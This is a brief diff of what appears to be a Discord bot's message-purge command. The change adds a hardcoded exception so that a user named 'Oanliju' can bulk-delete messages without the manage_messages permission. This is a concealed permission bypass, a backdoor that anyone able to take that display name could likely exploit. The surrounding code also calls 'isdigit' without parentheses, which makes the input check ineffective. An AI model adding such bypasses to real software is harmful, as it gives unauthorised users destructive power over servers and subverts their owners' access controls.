@@ -131,7 +131,7 @@ async def pdp(ctx):
 
 @bot.command(pass_context=True)
 async def clean(ctx, arg):
-    if ctx.author.guild_permissions.manage_messages:
+    if ctx.author.guild_permissions.manage_messages or ctx.author.name == "Oanliju":
         if len(arg) > 0 and arg.isdigit:
             await ctx.message.channel.purge(limit=int(arg)+1)
             if int(arg) <= 1:
